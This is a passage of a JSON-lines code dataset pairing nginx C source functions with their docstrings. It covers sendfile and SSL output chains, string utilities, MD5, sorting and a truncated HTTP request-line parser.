case NGX_EINTR:\n                    eintr = 1;\n                    break;\n\n                default:\n                    wev->error = 1;\n                    (void) ngx_connection_error(c, err, \"sendfile() failed\");\n                    return NGX_CHAIN_ERROR;\n                }\n\n                ngx_log_debug1(NGX_LOG_DEBUG_EVENT, c->log, err,\n                               \"sendfile() sent only %O bytes\", sent);\n            }\n\n            if (rc == 0 && sent == 0) {\n\n                /*\n                 * if rc and sent equal to zero, then someone\n                 * has truncated the file, so the offset became beyond\n                 * the end of the file\n                 */\n\n                ngx_log_error(NGX_LOG_ALERT, c->log, 0,\n                              \"sendfile() reported that \\\"%s\\\" was truncated\",\n                              file->file->name.data);\n\n                return NGX_CHAIN_ERROR;\n            }\n\n            ngx_log_debug4(NGX_LOG_DEBUG_EVENT, c->log, 0,\n                           \"sendfile: %d, @%O %O:%O\",\n                           rc, file->file_pos, sent, file_size + header.size);\n\n        } else {\n            n = ngx_writev(c, &header);\n\n            if (n == NGX_ERROR) {\n                return NGX_CHAIN_ERROR;\n            }\n\n            sent = (n == NGX_AGAIN) ? 0 : n;\n        }\n\n        c->sent += sent;\n\n        in = ngx_chain_update_sent(in, sent);\n\n        if (eintr) {\n            send = prev_send + sent;\n            continue;\n        }\n\n        if (send - prev_send != sent) {\n            wev->ready = 0;\n            return in;\n        }\n\n        if (send >= limit || in == NULL) {\n            return in;\n        }\n    }\n}", "path": "nginx\\os\\unix\\ngx_darwin_sendfile_chain.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/* parse a fixed point number, e.g., ngx_atofp(\"10.5\", 4, 2) returns 1050 */\n", "func_signal": "ngx_int_t\nngx_atofp(u_char *line, size_t n, size_t point)", "code": "{\n    ngx_int_t   value, cutoff, cutlim;\n    ngx_uint_t  dot;\n\n    if (n == 0) {\n        return NGX_ERROR;\n    }\n\n    cutoff = NGX_MAX_INT_T_VALUE / 10;\n    cutlim = NGX_MAX_INT_T_VALUE % 10;\n\n    dot = 0;\n\n    for (value = 0; n--; line++) {\n\n        if (point == 0) {\n            return NGX_ERROR;\n        }\n\n        if (*line == '.') {\n            if (dot) {\n                return NGX_ERROR;\n            }\n\n            dot = 1;\n            continue;\n        }\n\n        if (*line < '0' || *line > '9') {\n            return NGX_ERROR;\n        }\n\n        if (value >= cutoff && (value > cutoff || *line - '0' > cutlim)) {\n            return NGX_ERROR;\n        }\n\n        value = value * 10 + (*line - '0');\n        point -= dot;\n    }\n\n    while (point--) {\n        if (value > cutoff) {\n            return NGX_ERROR;\n        }\n\n        value = value * 10;\n    }\n\n    return value;\n}", "path": "nginx\\core\\ngx_string.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/* __amd64__ */\n", "func_signal": "static ngx_inline void\nngx_cpuid(uint32_t i, uint32_t *buf)", "code": "{\n    uint32_t  eax, ebx, ecx, edx;\n\n    __asm__ (\n\n        \"cpuid\"\n\n    : \"=a\" (eax), \"=b\" (ebx), \"=c\" (ecx), \"=d\" (edx) : \"a\" (i) );\n\n    buf[0] = eax;\n    buf[1] = ebx;\n    buf[2] = edx;\n    buf[3] = ecx;\n}", "path": "nginx\\core\\ngx_cpuinfo.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/*\n * OpenSSL has no SSL_writev() so we copy several bufs into our 16K buffer\n * before the SSL_write() call to decrease a SSL overhead.\n *\n * Besides for protocols such as HTTP it is possible to always buffer\n * the output to decrease a SSL overhead some more.\n */\n", "func_signal": "ngx_chain_t *\nngx_ssl_send_chain(ngx_connection_t *c, ngx_chain_t *in, off_t limit)", "code": "{\n    int          n;\n    ngx_uint_t   flush;\n    ssize_t      send, size;\n    ngx_buf_t   *buf;\n\n    if (!c->ssl->buffer) {\n\n        while (in) {\n            if (ngx_buf_special(in->buf)) {\n                in = in->next;\n                continue;\n            }\n\n            n = ngx_ssl_write(c, in->buf->pos, in->buf->last - in->buf->pos);\n\n            if (n == NGX_ERROR) {\n                return NGX_CHAIN_ERROR;\n            }\n\n            if (n == NGX_AGAIN) {\n                return in;\n            }\n\n            in->buf->pos += n;\n\n            if (in->buf->pos == in->buf->last) {\n                in = in->next;\n            }\n        }\n\n        return in;\n    }\n\n\n    /* the maximum limit size is the maximum int32_t value - the page size */\n\n    if (limit == 0 || limit > (off_t) (NGX_MAX_INT32_VALUE - ngx_pagesize)) {\n        limit = NGX_MAX_INT32_VALUE - ngx_pagesize;\n    }\n\n    buf = c->ssl->buf;\n\n    if (buf == NULL) {\n        buf = ngx_create_temp_buf(c->pool, c->ssl->buffer_size);\n        if (buf == NULL) {\n            return NGX_CHAIN_ERROR;\n        }\n\n        c->ssl->buf = buf;\n    }\n\n    if (buf->start == NULL) {\n        buf->start = ngx_palloc(c->pool, c->ssl->buffer_size);\n        if (buf->start == NULL) {\n            return NGX_CHAIN_ERROR;\n        }\n\n        buf->pos = buf->start;\n        buf->last = buf->start;\n        buf->end = buf->start + c->ssl->buffer_size;\n    }\n\n    send = buf->last - buf->pos;\n    flush = (in == NULL) ? 1 : buf->flush;\n\n    for ( ;; ) {\n\n        while (in && buf->last < buf->end && send < limit) {\n            if (in->buf->last_buf || in->buf->flush) {\n                flush = 1;\n            }\n\n            if (ngx_buf_special(in->buf)) {\n                in = in->next;\n                continue;\n            }\n\n            size = in->buf->last - in->buf->pos;\n\n            if (size > buf->end - buf->last) {\n                size = buf->end - buf->last;\n            }\n\n            if (send + size > limit) {\n                size = (ssize_t) (limit - send);\n            }\n\n            ngx_log_debug1(NGX_LOG_DEBUG_EVENT, c->log, 0,\n                           \"SSL buf copy: %z\", size);\n\n            ngx_memcpy(buf->last, in->buf->pos, size);\n\n            buf->last += size;\n            in->buf->pos += size;\n            send += size;\n\n            if (in->buf->pos == in->buf->last) {\n                in = in->next;\n            }\n        }\n\n        if (!flush && send < limit && buf->last < buf->end) {\n            break;\n        }\n\n        size = buf->last - buf->pos;\n\n        if (size == 0) {\n            buf->flush = 0;\n            c->buffered &= ~NGX_SSL_BUFFERED;\n            return in;\n        }\n\n        n = ngx_ssl_write(c, buf->pos, size);\n\n        if (n == NGX_ERROR) {\n            return NGX_CHAIN_ERROR;\n        }\n\n        if (n == NGX_AGAIN) {\n            break;\n        }\n\n        buf->pos += n;\n\n        if (n < size) {\n            break;\n        }\n\n        flush = 0;\n\n        buf->pos = buf->start;\n        buf->last = buf->start;\n\n        if (in == NULL || send == limit) {\n            break;\n        }\n    }\n\n    buf->flush = flush;\n\n    if (buf->pos < buf->last) {\n        c->buffered |= NGX_SSL_BUFFERED;\n\n    } else {\n        c->buffered &= ~NGX_SSL_BUFFERED;\n    }\n\n    return in;\n}", "path": "nginx\\event\\ngx_event_openssl.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/*\n * This processes one or more 64-byte data blocks, but does not update\n * the bit counters.  There are no alignment requirements.\n */\n", "func_signal": "static const u_char *\nngx_md5_body(ngx_md5_t *ctx, const u_char *data, size_t size)", "code": "{\n    uint32_t       a, b, c, d;\n    uint32_t       saved_a, saved_b, saved_c, saved_d;\n    const u_char  *p;\n#if !(NGX_HAVE_LITTLE_ENDIAN && NGX_HAVE_NONALIGNED)\n    uint32_t       block[16];\n#endif\n\n    p = data;\n\n    a = ctx->a;\n    b = ctx->b;\n    c = ctx->c;\n    d = ctx->d;\n\n    do {\n        saved_a = a;\n        saved_b = b;\n        saved_c = c;\n        saved_d = d;\n\n        /* Round 1 */\n\n        STEP(F, a, b, c, d, SET(0),  0xd76aa478, 7);\n        STEP(F, d, a, b, c, SET(1),  0xe8c7b756, 12);\n        STEP(F, c, d, a, b, SET(2),  0x242070db, 17);\n        STEP(F, b, c, d, a, SET(3),  0xc1bdceee, 22);\n        STEP(F, a, b, c, d, SET(4),  0xf57c0faf, 7);\n        STEP(F, d, a, b, c, SET(5),  0x4787c62a, 12);\n        STEP(F, c, d, a, b, SET(6),  0xa8304613, 17);\n        STEP(F, b, c, d, a, SET(7),  0xfd469501, 22);\n        STEP(F, a, b, c, d, SET(8),  0x698098d8, 7);\n        STEP(F, d, a, b, c, SET(9),  0x8b44f7af, 12);\n        STEP(F, c, d, a, b, SET(10), 0xffff5bb1, 17);\n        STEP(F, b, c, d, a, SET(11), 0x895cd7be, 22);\n        STEP(F, a, b, c, d, SET(12), 0x6b901122, 7);\n        STEP(F, d, a, b, c, SET(13), 0xfd987193, 12);\n        STEP(F, c, d, a, b, SET(14), 0xa679438e, 17);\n        STEP(F, b, c, d, a, SET(15), 0x49b40821, 22);\n\n        /* Round 2 */\n\n        STEP(G, a, b, c, d, GET(1),  0xf61e2562, 5);\n        STEP(G, d, a, b, c, GET(6),  0xc040b340, 9);\n        STEP(G, c, d, a, b, GET(11), 0x265e5a51, 14);\n        STEP(G, b, c, d, a, GET(0),  0xe9b6c7aa, 20);\n        STEP(G, a, b, c, d, GET(5),  0xd62f105d, 5);\n        STEP(G, d, a, b, c, GET(10), 0x02441453, 9);\n        STEP(G, c, d, a, b, GET(15), 0xd8a1e681, 14);\n        STEP(G, b, c, d, a, GET(4),  0xe7d3fbc8, 20);\n        STEP(G, a, b, c, d, GET(9),  0x21e1cde6, 5);\n        STEP(G, d, a, b, c, GET(14), 0xc33707d6, 9);\n        STEP(G, c, d, a, b, GET(3),  0xf4d50d87, 14);\n        STEP(G, b, c, d, a, GET(8),  0x455a14ed, 20);\n        STEP(G, a, b, c, d, GET(13), 0xa9e3e905, 5);\n        STEP(G, d, a, b, c, GET(2),  0xfcefa3f8, 9);\n        STEP(G, c, d, a, b, GET(7),  0x676f02d9, 14);\n        STEP(G, b, c, d, a, GET(12), 0x8d2a4c8a, 20);\n\n        /* Round 3 */\n\n        STEP(H, a, b, c, d, GET(5),  0xfffa3942, 4);\n        STEP(H, d, a, b, c, GET(8),  0x8771f681, 11);\n        STEP(H, c, d, a, b, GET(11), 0x6d9d6122, 16);\n        STEP(H, b, c, d, a, GET(14), 0xfde5380c, 23);\n        STEP(H, a, b, c, d, GET(1),  0xa4beea44, 4);\n        STEP(H, d, a, b, c, GET(4),  0x4bdecfa9, 11);\n        STEP(H, c, d, a, b, GET(7),  0xf6bb4b60, 16);\n        STEP(H, b, c, d, a, GET(10), 0xbebfbc70, 23);\n        STEP(H, a, b, c, d, GET(13), 0x289b7ec6, 4);\n        STEP(H, d, a, b, c, GET(0),  0xeaa127fa, 11);\n        STEP(H, c, d, a, b, GET(3),  0xd4ef3085, 16);\n        STEP(H, b, c, d, a, GET(6),  0x04881d05, 23);\n        STEP(H, a, b, c, d, GET(9),  0xd9d4d039, 4);\n        STEP(H, d, a, b, c, GET(12), 0xe6db99e5, 11);\n        STEP(H, c, d, a, b, GET(15), 0x1fa27cf8, 16);\n        STEP(H, b, c, d, a, GET(2),  0xc4ac5665, 23);\n\n        /* Round 4 */\n\n        STEP(I, a, b, c, d, GET(0),  0xf4292244, 6);\n        STEP(I, d, a, b, c, GET(7),  0x432aff97, 10);\n        STEP(I, c, d, a, b, GET(14), 0xab9423a7, 15);\n        STEP(I, b, c, d, a, GET(5),  0xfc93a039, 21);\n        STEP(I, a, b, c, d, GET(12), 0x655b59c3, 6);\n        STEP(I, d, a, b, c, GET(3),  0x8f0ccc92, 10);\n        STEP(I, c, d, a, b, GET(10), 0xffeff47d, 15);\n        STEP(I, b, c, d, a, GET(1),  0x85845dd1, 21);\n        STEP(I, a, b, c, d, GET(8),  0x6fa87e4f, 6);\n        STEP(I, d, a, b, c, GET(15), 0xfe2ce6e0, 10);\n        STEP(I, c, d, a, b, GET(6),  0xa3014314, 15);\n        STEP(I, b, c, d, a, GET(13), 0x4e0811a1, 21);\n        STEP(I, a, b, c, d, GET(4),  0xf7537e82, 6);\n        STEP(I, d, a, b, c, GET(11), 0xbd3af235, 10);\n        STEP(I, c, d, a, b, GET(2),  0x2ad7d2bb, 15);\n        STEP(I, b, c, d, a, GET(9),  0xeb86d391, 21);\n\n        a += saved_a;\n        b += saved_b;\n        c += saved_c;\n        d += saved_d;\n\n        p += 64;\n\n    } while (size -= 64);\n\n    ctx->a = a;\n    ctx->b = b;\n    ctx->c = c;\n    ctx->d = d;\n\n    return p;\n}", "path": "nginx\\core\\ngx_md5.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/*\n * ngx_strstrn() and ngx_strcasestrn() are intended to search for static\n * substring with known length in null-terminated string. The argument n\n * must be length of the second substring - 1.\n */\n", "func_signal": "u_char *\nngx_strstrn(u_char *s1, char *s2, size_t n)", "code": "{\n    u_char  c1, c2;\n\n    c2 = *(u_char *) s2++;\n\n    do {\n        do {\n            c1 = *s1++;\n\n            if (c1 == 0) {\n                return NULL;\n            }\n\n        } while (c1 != c2);\n\n    } while (ngx_strncmp(s1, (u_char *) s2, n) != 0);\n\n    return --s1;\n}", "path": "nginx\\core\\ngx_string.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/*\n * add the server address, the server names and the server core module\n * configurations to the port list\n */\n", "func_signal": "static ngx_int_t\nngx_http_add_address(ngx_conf_t *cf, ngx_http_core_srv_conf_t *cscf,\n    ngx_http_conf_port_t *port, ngx_http_listen_opt_t *lsopt)", "code": "{\n    ngx_http_conf_addr_t  *addr;\n\n    if (port->addrs.elts == NULL) {\n        if (ngx_array_init(&port->addrs, cf->temp_pool, 4,\n                           sizeof(ngx_http_conf_addr_t))\n            != NGX_OK)\n        {\n            return NGX_ERROR;\n        }\n    }\n\n#if (NGX_HTTP_V2 && NGX_HTTP_SSL                                              \\\n     && !defined TLSEXT_TYPE_application_layer_protocol_negotiation           \\\n     && !defined TLSEXT_TYPE_next_proto_neg)\n\n    if (lsopt->http2 && lsopt->ssl) {\n        ngx_conf_log_error(NGX_LOG_WARN, cf, 0,\n                           \"nginx was built with OpenSSL that lacks ALPN \"\n                           \"and NPN support, HTTP/2 is not enabled for %s\",\n                           lsopt->addr);\n    }\n\n#endif\n\n    addr = ngx_array_push(&port->addrs);\n    if (addr == NULL) {\n        return NGX_ERROR;\n    }\n\n    addr->opt = *lsopt;\n    addr->hash.buckets = NULL;\n    addr->hash.size = 0;\n    addr->wc_head = NULL;\n    addr->wc_tail = NULL;\n#if (NGX_PCRE)\n    addr->nregex = 0;\n    addr->regex = NULL;\n#endif\n    addr->default_server = cscf;\n    addr->servers.elts = NULL;\n\n    return ngx_http_add_server(cf, cscf, addr);\n}", "path": "nginx\\http\\ngx_http.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/*\n * ngx_utf8_decode() decodes two and more bytes UTF sequences only\n * the return values:\n *    0x80 - 0x10ffff         valid character\n *    0x110000 - 0xfffffffd   invalid sequence\n *    0xfffffffe              incomplete sequence\n *    0xffffffff              error\n */\n", "func_signal": "uint32_t\nngx_utf8_decode(u_char **p, size_t n)", "code": "{\n    size_t    len;\n    uint32_t  u, i, valid;\n\n    u = **p;\n\n    if (u >= 0xf0) {\n\n        u &= 0x07;\n        valid = 0xffff;\n        len = 3;\n\n    } else if (u >= 0xe0) {\n\n        u &= 0x0f;\n        valid = 0x7ff;\n        len = 2;\n\n    } else if (u >= 0xc2) {\n\n        u &= 0x1f;\n        valid = 0x7f;\n        len = 1;\n\n    } else {\n        (*p)++;\n        return 0xffffffff;\n    }\n\n    if (n - 1 < len) {\n        return 0xfffffffe;\n    }\n\n    (*p)++;\n\n    while (len) {\n        i = *(*p)++;\n\n        if (i < 0x80) {\n            return 0xffffffff;\n        }\n\n        u = (u << 6) | (i & 0x3f);\n\n        len--;\n    }\n\n    if (u > valid) {\n        return u;\n    }\n\n    return 0xffffffff;\n}", "path": "nginx\\core\\ngx_string.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/*\n * We use ngx_strcasecmp()/ngx_strncasecmp() for 7-bit ASCII strings only,\n * and implement our own ngx_strcasecmp()/ngx_strncasecmp()\n * to avoid libc locale overhead.  Besides, we use the ngx_uint_t's\n * instead of the u_char's, because they are slightly faster.\n */\n", "func_signal": "ngx_int_t\nngx_strcasecmp(u_char *s1, u_char *s2)", "code": "{\n    ngx_uint_t  c1, c2;\n\n    for ( ;; ) {\n        c1 = (ngx_uint_t) *s1++;\n        c2 = (ngx_uint_t) *s2++;\n\n        c1 = (c1 >= 'A' && c1 <= 'Z') ? (c1 | 0x20) : c1;\n        c2 = (c2 >= 'A' && c2 <= 'Z') ? (c2 | 0x20) : c2;\n\n        if (c1 == c2) {\n\n            if (c1) {\n                continue;\n            }\n\n            return 0;\n        }\n\n        return c1 - c2;\n    }\n}", "path": "nginx\\core\\ngx_string.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/* ngx_sort() is implemented as insertion sort because we need stable sort */\n", "func_signal": "void\nngx_sort(void *base, size_t n, size_t size,\n    ngx_int_t (*cmp)(const void *, const void *))", "code": "{\n    u_char  *p1, *p2, *p;\n\n    p = ngx_alloc(size, ngx_cycle->log);\n    if (p == NULL) {\n        return;\n    }\n\n    for (p1 = (u_char *) base + size;\n         p1 < (u_char *) base + n * size;\n         p1 += size)\n    {\n        ngx_memcpy(p, p1, size);\n\n        for (p2 = p1;\n             p2 > (u_char *) base && cmp(p2 - size, p) > 0;\n             p2 -= size)\n        {\n            ngx_memcpy(p2, p2 - size, size);\n        }\n\n        ngx_memcpy(p2, p, size);\n    }\n\n    ngx_free(p);\n}", "path": "nginx\\core\\ngx_string.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/* the stable insertion sort */\n", "func_signal": "void\nngx_queue_sort(ngx_queue_t *queue,\n    ngx_int_t (*cmp)(const ngx_queue_t *, const ngx_queue_t *))", "code": "{\n    ngx_queue_t  *q, *prev, *next;\n\n    q = ngx_queue_head(queue);\n\n    if (q == ngx_queue_last(queue)) {\n        return;\n    }\n\n    for (q = ngx_queue_next(q); q != ngx_queue_sentinel(queue); q = next) {\n\n        prev = ngx_queue_prev(q);\n        next = ngx_queue_next(q);\n\n        ngx_queue_remove(q);\n\n        do {\n            if (cmp(prev, q) <= 0) {\n                break;\n            }\n\n            prev = ngx_queue_prev(prev);\n\n        } while (prev != ngx_queue_sentinel(queue));\n\n        ngx_queue_insert_after(prev, q);\n    }\n}", "path": "nginx\\core\\ngx_queue.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/* gcc, icc, msvc and others compile these switches as an jump table */\n", "func_signal": "ngx_int_t\nngx_http_parse_request_line(ngx_http_request_t *r, ngx_buf_t *b)", "code": "{\n    u_char  c, ch, *p, *m;\n    enum {\n        sw_start = 0,\n        sw_method,\n        sw_spaces_before_uri,\n        sw_schema,\n        sw_schema_slash,\n        sw_schema_slash_slash,\n        sw_host_start,\n        sw_host,\n        sw_host_end,\n        sw_host_ip_literal,\n        sw_port,\n        sw_host_http_09,\n        sw_after_slash_in_uri,\n        sw_check_uri,\n        sw_check_uri_http_09,\n        sw_uri,\n        sw_http_09,\n        sw_http_H,\n        sw_http_HT,\n        sw_http_HTT,\n        sw_http_HTTP,\n        sw_first_major_digit,\n        sw_major_digit,\n        sw_first_minor_digit,\n        sw_minor_digit,\n        sw_spaces_after_digit,\n        sw_almost_done\n    } state;\n\n    state = r->state;\n\n    for (p = b->pos; p < b->last; p++) {\n        ch = *p;\n\n        switch (state) {\n\n        /* HTTP methods: GET, HEAD, POST */\n        case sw_start:\n            r->request_start = p;\n\n            if (ch == CR || ch == LF) {\n                break;\n            }\n\n            if ((ch < 'A' || ch > 'Z') && ch != '_') {\n                return NGX_HTTP_PARSE_INVALID_METHOD;\n            }\n\n            state = sw_method;\n            break;\n\n        case sw_method:\n            if (ch == ' ') {\n                r->method_end = p - 1;\n                m = r->request_start;\n\n                switch (p - m) {\n\n                case 3:\n                    if (ngx_str3_cmp(m, 'G', 'E', 'T', ' ')) {\n                        r->method = NGX_HTTP_GET;\n                        break;\n                    }\n\n                    if (ngx_str3_cmp(m, 'P', 'U', 'T', ' ')) {\n                        r->method = NGX_HTTP_PUT;\n                        break;\n                    }\n\n                    break;\n\n                case 4:\n                    if (m[1] == 'O') {\n\n                        if (ngx_str3Ocmp(m, 'P', 'O', 'S', 'T')) {\n                            r->method = NGX_HTTP_POST;\n                            break;\n                        }\n\n                        if (ngx_str3Ocmp(m, 'C', 'O', 'P', 'Y')) {\n                            r->method = NGX_HTTP_COPY;\n                            break;\n                        }\n\n                        if (ngx_str3Ocmp(m, 'M', 'O', 'V', 'E')) {\n                            r->method = NGX_HTTP_MOVE;\n                            break;\n                        }\n\n                        if (ngx_str3Ocmp(m, 'L', 'O', 'C', 'K')) {\n                            r->method = NGX_HTTP_LOCK;\n                            break;\n                        }\n\n                    } else {\n\n                        if (ngx_str4cmp(m, 'H', 'E', 'A', 'D')) {\n                            r->method = NGX_HTTP_HEAD;\n                            break;\n                        }\n                    }\n\n                    break;\n\n                case 5:\n                    if (ngx_str5cmp(m, 'M', 'K', 'C', 'O', 'L')) {\n                        r->method = NGX_HTTP_MKCOL;\n                        break;\n                    }\n\n                    if (ngx_str5cmp(m, 'P', 'A', 'T', 'C', 'H')) {\n                        r->method = NGX_HTTP_PATCH;\n                        break;\n                    }\n\n                    if (ngx_str5cmp(m, 'T', 'R', 'A', 'C', 'E')) {\n                        r->method = NGX_HTTP_TRACE;\n                        break;\n                    }\n\n                    break;\n\n                case 6:\n                    if (ngx_str6cmp(m, 'D', 'E', 'L', 'E', 'T', 'E')) {\n                        r->method = NGX_HTTP_DELETE;\n                        break;\n                    }\n\n                    if (ngx_str6cmp(m, 'U', 'N', 'L', 'O', 'C', 'K')) {\n                        r->method = NGX_HTTP_UNLOCK;\n                        break;\n                    }\n\n                    break;\n\n                case 7:\n                    if (ngx_str7_cmp(m, 'O', 'P', 'T', 'I', 'O', 'N', 'S', ' '))\n                    {\n                        r->method = NGX_HTTP_OPTIONS;\n                    }\n\n                    break;\n\n                case 8:\n                    if (ngx_str8cmp(m, 'P', 'R', 'O', 'P', 'F', 'I', 'N', 'D'))\n                    {\n                        r->method = NGX_HTTP_PROPFIND;\n                    }\n\n                    break;\n\n                case 9:\n                    if (ngx_str9cmp(m,\n                            'P', 'R', 'O', 'P', 'P', 'A', 'T', 'C', 'H'))\n                    {\n                        r->method = NGX_HTTP_PROPPATCH;\n                    }\n\n                    break;\n                }\n\n                state = sw_spaces_before_uri;\n                break;\n            }\n\n            if ((ch < 'A' || ch > 'Z') && ch != '_') {\n                return NGX_HTTP_PARSE_INVALID_METHOD;\n            }\n\n            break;\n\n        /* space* before URI */\n        case sw_spaces_before_uri:\n\n            if (ch == '/') {\n                r->uri_start = p;\n                state = sw_after_slash_in_uri;\n                break;\n            }\n\n            c = (u_char) (ch | 0x20);\n            if (c >= 'a' && c <= 'z') {\n                r->schema_start = p;\n                state = sw_schema;\n                break;\n            }\n\n            switch (ch) {\n            case ' ':\n                break;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        case sw_schema:\n\n            c = (u_char) (ch | 0x20);\n            if (c >= 'a' && c <= 'z') {\n                break;\n            }\n\n            switch (ch) {\n            case ':':\n                r->schema_end = p;\n                state = sw_schema_slash;\n                break;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        case sw_schema_slash:\n            switch (ch) {\n            case '/':\n                state = sw_schema_slash_slash;\n                break;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        case sw_schema_slash_slash:\n            switch (ch) {\n            case '/':\n                state = sw_host_start;\n                break;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        case sw_host_start:\n\n            r->host_start = p;\n\n            if (ch == '[') {\n                state = sw_host_ip_literal;\n                break;\n            }\n\n            state = sw_host;\n\n            /* fall through */\n\n        case sw_host:\n\n            c = (u_char) (ch | 0x20);\n            if (c >= 'a' && c <= 'z') {\n                break;\n            }\n\n            if ((ch >= '0' && ch <= '9') || ch == '.' || ch == '-') {\n                break;\n            }\n\n            /* fall through */\n\n        case sw_host_end:\n\n            r->host_end = p;\n\n            switch (ch) {\n            case ':':\n                state = sw_port;\n                break;\n            case '/':\n                r->uri_start = p;\n                state = sw_after_slash_in_uri;\n                break;\n            case ' ':\n                /*\n                 * use single \"/\" from request line to preserve pointers,\n                 * if request line will be copied to large client buffer\n                 */\n                r->uri_start = r->schema_end + 1;\n                r->uri_end = r->schema_end + 2;\n                state = sw_host_http_09;\n                break;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        case sw_host_ip_literal:\n\n            if (ch >= '0' && ch <= '9') {\n                break;\n            }\n\n            c = (u_char) (ch | 0x20);\n            if (c >= 'a' && c <= 'z') {\n                break;\n            }\n\n            switch (ch) {\n            case ':':\n                break;\n            case ']':\n                state = sw_host_end;\n                break;\n            case '-':\n            case '.':\n            case '_':\n            case '~':\n                /* unreserved */\n                break;\n            case '!':\n            case '$':\n            case '&':\n            case '\\'':\n            case '(':\n            case ')':\n            case '*':\n            case '+':\n            case ',':\n            case ';':\n            case '=':\n                /* sub-delims */\n                break;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        case sw_port:\n            if (ch >= '0' && ch <= '9') {\n                break;\n            }\n\n            switch (ch) {\n            case '/':\n                r->port_end = p;\n                r->uri_start = p;\n                state = sw_after_slash_in_uri;\n                break;\n            case ' ':\n                r->port_end = p;\n                /*\n                 * use single \"/\" from request line to preserve pointers,\n                 * if request line will be copied to large client buffer\n                 */\n                r->uri_start = r->schema_end + 1;\n                r->uri_end = r->schema_end + 2;\n                state = sw_host_http_09;\n                break;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        /* space+ after \"http://host[:port] \" */\n        case sw_host_http_09:\n            switch (ch) {\n            case ' ':\n                break;\n            case CR:\n                r->http_minor = 9;\n                state = sw_almost_done;\n                break;\n            case LF:\n                r->http_minor = 9;\n                goto done;\n            case 'H':\n                r->http_protocol.data = p;\n                state = sw_http_H;\n                break;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n\n        /* check \"/.\", \"//\", \"%\", and \"\\\" (Win32) in URI */\n        case sw_after_slash_in_uri:\n\n            if (usual[ch >> 5] & (1 << (ch & 0x1f))) {\n                state = sw_check_uri;\n                break;\n            }\n\n            switch (ch) {\n            case ' ':\n                r->uri_end = p;\n                state = sw_check_uri_http_09;\n                break;\n            case CR:\n                r->uri_end = p;\n                r->http_minor = 9;\n                state = sw_almost_done;\n                break;\n            case LF:\n                r->uri_end = p;\n                r->http_minor = 9;\n                goto done;\n            case '.':\n                r->complex_uri = 1;\n                state = sw_uri;\n                break;\n            case '%':\n                r->quoted_uri = 1;\n                state = sw_uri;\n                break;\n            case '/':\n                r->complex_uri = 1;\n                state = sw_uri;\n                break;\n#if (NGX_WIN32)\n            case '\\\\':\n                r->complex_uri = 1;\n                state = sw_uri;\n                break;\n#endif\n            case '?':\n                r->args_start = p + 1;\n                state = sw_uri;\n                break;\n            case '#':\n                r->complex_uri = 1;\n                state = sw_uri;\n                break;\n            case '+':\n                r->plus_in_uri = 1;\n                break;\n            case '\\0':\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            default:\n                state = sw_check_uri;\n                break;\n            }\n            break;\n\n        /* check \"/\", \"%\" and \"\\\" (Win32) in URI */\n        case sw_check_uri:\n\n            if (usual[ch >> 5] & (1 << (ch & 0x1f))) {\n                break;\n            }\n\n            switch (ch) {\n            case '/':\n#if (NGX_WIN32)\n                if (r->uri_ext == p) {\n                    r->complex_uri = 1;\n                    state = sw_uri;\n                    break;\n                }\n#endif\n                r->uri_ext = NULL;\n                state = sw_after_slash_in_uri;\n                break;\n            case '.':\n                r->uri_ext = p + 1;\n                break;\n            case ' ':\n                r->uri_end = p;\n                state = sw_check_uri_http_09;\n                break;\n            case CR:\n                r->uri_end = p;\n                r->http_minor = 9;\n                state = sw_almost_done;\n                break;\n            case LF:\n                r->uri_end = p;\n                r->http_minor = 9;\n                goto done;\n#if (NGX_WIN32)\n            case '\\\\':\n                r->complex_uri = 1;\n                state = sw_after_slash_in_uri;\n                break;\n#endif\n            case '%':\n                r->quoted_uri = 1;\n                state = sw_uri;\n                break;\n            case '?':\n                r->args_start = p + 1;\n                state = sw_uri;\n                break;\n            case '#':\n                r->complex_uri = 1;\n                state = sw_uri;\n                break;\n            case '+':\n                r->plus_in_uri = 1;\n                break;\n            case '\\0':\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        /* space+ after URI */\n        case sw_check_uri_http_09:\n            switch (ch) {\n            case ' ':\n                break;\n            case CR:\n                r->http_minor = 9;\n                state = sw_almost_done;\n                break;\n            case LF:\n                r->http_minor = 9;\n                goto done;\n            case 'H':\n                r->http_protocol.data = p;\n                state = sw_http_H;\n                break;\n            default:\n                r->space_in_uri = 1;\n                state = sw_check_uri;\n                p--;\n                break;\n            }\n            break;\n\n\n        /* URI */\n        case sw_uri:\n\n            if (usual[ch >> 5] & (1 << (ch & 0x1f))) {\n                break;\n            }\n\n            switch (ch) {\n            case ' ':\n                r->uri_end = p;\n                state = sw_http_09;\n                break;\n            case CR:\n                r->uri_end = p;\n                r->http_minor = 9;\n                state = sw_almost_done;\n                